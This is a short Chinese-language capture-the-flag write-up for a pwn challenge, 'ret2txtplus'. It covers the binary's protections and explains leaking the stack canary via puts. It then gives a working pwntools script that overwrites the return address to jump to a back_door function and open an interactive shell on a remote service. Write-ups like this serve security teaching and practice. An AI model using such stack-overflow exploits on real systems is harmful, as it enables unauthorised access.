# ret2txtplus

~~当我在想为什么题目会多一个e时我自己就多输了1个e~~

## 文件分析

下载`ret2txtp`, NX on, PIE off, Canary on, RELRO no  
ghidra分析为64位程序

## 解题思路

通过溢出canary的第一个字符，可以借助puts把剩下的canary打印出来，
因为没有pie，直接返回到`back_door`即可（需要ret补rsp）

## EXPLOIT

```python
from pwn import *
sh = remote(???, 10038)
sh.sendline(b'0'*0x17 + b'.') # '\n' override 1st byte of canary
sh.recvuntil(b'.\n')
data = sh.recvline()
canary = u64(b'\0' + data[:7])
sh.sendline(b'0'*0x18 + p64(canary) + b'0'*8 + p64(0x4007a6) + p64(0x400761)) # ret; back_doorAddr
sh.interactive()
```

Done.
